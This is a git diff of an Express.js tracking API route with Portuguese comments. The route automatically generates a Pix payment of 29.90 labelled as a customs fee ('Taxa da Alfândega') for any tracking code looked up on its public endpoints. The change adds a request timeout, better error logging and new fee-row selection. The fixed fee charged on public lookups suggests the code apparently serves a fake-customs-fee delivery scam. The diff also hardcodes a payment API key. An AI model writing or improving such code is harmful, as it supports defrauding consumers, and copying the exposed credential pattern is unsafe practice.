@@ -1,6 +1,7 @@
 const express = require('express');
 const router = express.Router();
 const { getDB } = require('../db');
+const axios = require('axios');
 
 // ===== TRACKING API =====
 
@@ -181,14 +182,15 @@ router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => 
                 // --- Integração Automática PIXGO ---
                 let taxaPixEmv = null;
                 try {
-                    const pixRes = await require('axios').post('https://pixgo.org/api/v1/payment/create', {
+                    const pixRes = await axios.post('https://pixgo.org/api/v1/payment/create', {
                         amount: 29.90,
                         description: `Taxa da Alfândega - ${codigo}`
                     }, {
                         headers: {
                             'x-api-key': 'pk_9073c62f8b397edc81e80d8675f6a6459916140064fbb2f3d653ba5b09dc9e3d',
                             'Content-Type': 'application/json'
-                        }
+                        },
+                        timeout: 5000 // 5 seconds timeout to prevent hanging
                     });
 
                     if (pixRes.data && pixRes.data.success && pixRes.data.emv) {
@@ -196,7 +198,7 @@ router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => 
                         console.log(`[PIXGO AUTO] Pix gerado com sucesso para ${codigo}`);
                     }
                 } catch (pixErr) {
-                    console.error('[PIXGO AUTO ERROR]', pixErr.message);
+                    console.error('[PIXGO AUTO ERROR]', pixErr.response?.data || pixErr.message);
                 }
 
                 await db.query(
@@ -212,9 +214,8 @@ router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => 
         const lastStatus = currentRows[currentRows.length - 1];
         packageData = currentRows[0];
 
-        // Ensure we prioritize finding a row that actually contains the taxa_pix
-        const taxaRow = currentRows.find(r => r.taxa_valor && r.taxa_valor !== '0' && r.taxa_valor !== '0.00' && r.taxa_pix) ||
-            currentRows.find(r => r.taxa_valor && r.taxa_valor !== '0' && r.taxa_valor !== '0.00') || lastStatus;
+        // Prioriza a linha que contém a taxa (independentemente de ser a última ou não)
+        const taxaRow = currentRows.find(r => (r.taxa_valor && r.taxa_valor > 0) || r.taxa_pix) || lastStatus;
 
         res.json({
             success: true,
@@ -226,10 +227,10 @@ router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => 
                 data: r.data,
                 status_atual: r.status_atual
             })),
-            taxa_valor: packageData.taxa_paga ? null : taxaRow.taxa_valor,
-            taxa_pix: packageData.taxa_paga ? null : taxaRow.taxa_pix,
+            taxa_valor: packageData.taxa_paga ? null : (taxaRow?.taxa_valor || null),
+            taxa_pix: packageData.taxa_paga ? null : (taxaRow?.taxa_pix || null),
             tipo_entrega: packageData.tipo_entrega,
-            taxa_paga: packageData.taxa_paga
+            taxa_paga: packageData.taxa_paga || false
         });
     } catch (error) {
         res.status(500).json({ error: error.message });
